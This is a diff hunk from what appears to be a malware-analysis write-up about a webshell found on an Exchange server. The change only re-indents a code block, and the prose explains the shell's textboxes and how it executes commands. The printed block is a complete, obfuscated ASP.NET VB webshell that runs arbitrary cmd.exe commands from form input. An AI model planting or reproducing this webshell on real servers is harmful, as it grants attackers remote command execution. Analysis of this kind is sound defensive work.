@@ -146,34 +146,34 @@ The webshell file was uploaded on Exchange server which contains base64 encoded 
 when the webshell is accessed using a browser, two textboxes will be displayed along with a button. One textbox is for the path, usually it is “cmd.exe”, the other textbox is for the arguments that will be passed to the “cmd.exe”. After pressing the button, it will execute the function “xmmmsjowe” on server. This will create a new process for command prompt and execute the command. The result of the command will be sent to the client the label with id “fldfldfw” will show the result indicating whether the command was successfully executed or not.
 
 ```vbnet
-<%@ Page LanGuaGe='VB' Debug='tRUe' %>
- <%@ imPOrt NamESpAce='system.IO' %>
- <%@ imPOrt NamESpAce='System.Diagnostics' %>
- <scRIPt runat='server'>
- Sub xmmmsjowe()
-   Dim wertewt AS NeW PrOCesS()
-   Dim wertewtewe As New ProCeSsStaRtInFo(zxcerwew.teXt)
-   wertewtewe.UsESheLlExeCuTe=fALse
-   wertewtewe.RedIRectStaNDardOuTPut=tRUe
-   wertewt.StARtInFo = wertewtewe
-   wertewtewe.ArGumENts=vcxwsasddd.teXt
-   wertewt.StARt()
-   Dim xxwertewtewe As StreamReader=wertewt.StanDardOutput
-   Dim xxwrrertewtewe As StRIng = xxwertewtewe.ReAdtOEnd()
-   wertewt.Close()
-   fldfldfw.text= xxwrrertewtewe
- End Sub
- </scRIPt>
- <html>
- <body>
- <style>#div1{background:white}</style><style>#div1{width:100%}</style><style>#div1{height:100%}</style><style>#div1{position:fixed}</style>
- <div id='div1'></div>
- <form runat='server'>
- <asp:TeXtBOx id='zxcerwew' runat='server' Width='300px'></asp:TeXtBOx>
- <asp:TeXtBOx id='vcxwsasddd' runat='server' Width='300px'></asp:TeXtBOx>
- <p><asp:Button id='Button' onclick='xmmmsjowe' runat='server' Width='100px'></asp:Button>
- <p><asp:Label id='fldfldfw' runat='server'></asp:Label>
- </form>
- </body>
- </html>
+    <%@ Page LanGuaGe='VB' Debug='tRUe' %>
+     <%@ imPOrt NamESpAce='system.IO' %>
+     <%@ imPOrt NamESpAce='System.Diagnostics' %>
+     <scRIPt runat='server'>
+     Sub xmmmsjowe()
+       Dim wertewt AS NeW PrOCesS()
+       Dim wertewtewe As New ProCeSsStaRtInFo(zxcerwew.teXt)
+       wertewtewe.UsESheLlExeCuTe=fALse
+       wertewtewe.RedIRectStaNDardOuTPut=tRUe
+       wertewt.StARtInFo = wertewtewe
+       wertewtewe.ArGumENts=vcxwsasddd.teXt
+       wertewt.StARt()
+       Dim xxwertewtewe As StreamReader=wertewt.StanDardOutput
+       Dim xxwrrertewtewe As StRIng = xxwertewtewe.ReAdtOEnd()
+       wertewt.Close()
+       fldfldfw.text= xxwrrertewtewe
+     End Sub
+     </scRIPt>
+     <html>
+     <body>
+     <style>#div1{background:white}</style><style>#div1{width:100%}</style><style>#div1{height:100%}</style><style>#div1{position:fixed}</style>
+     <div id='div1'></div>
+     <form runat='server'>
+     <asp:TeXtBOx id='zxcerwew' runat='server' Width='300px'></asp:TeXtBOx>
+     <asp:TeXtBOx id='vcxwsasddd' runat='server' Width='300px'></asp:TeXtBOx>
+     <p><asp:Button id='Button' onclick='xmmmsjowe' runat='server' Width='100px'></asp:Button>
+     <p><asp:Label id='fldfldfw' runat='server'></asp:Label>
+     </form>
+     </body>
+     </html>
 ```
